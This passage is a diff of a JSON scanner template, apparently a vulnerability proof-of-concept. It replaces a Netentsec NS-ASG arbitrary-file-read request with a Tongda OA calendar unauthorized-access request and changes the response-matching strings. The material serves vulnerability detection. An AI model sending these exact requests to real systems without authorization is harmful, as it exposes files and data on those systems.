@@ -1,13 +1,13 @@
 {
-    "Name": "netentsec-asg-file-read",
-    "Description": "Netentsec NS-ASG Security Gateway Arbitrary File Read Vulnerability",
-    "Product": "Netentsec",
+    "Name": "Tongda OA Meeting Unauthorized Access",
+    "Description": "Tongda OA Meeting Unauthorized Access",
+    "Product": "Tongda OA",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
-        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Accept-Encoding":"deflate"},
+        "Uri":"/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,12 +18,12 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "$certfile"
+                "Value": "creator"
                 },
                 {
                  "Operation": "contains", 
                  "Key":"",
-                 "Value": "application/pdf"
+                 "Value": "originalTitle"
                  },
                  {
                 "Operation": "code", 
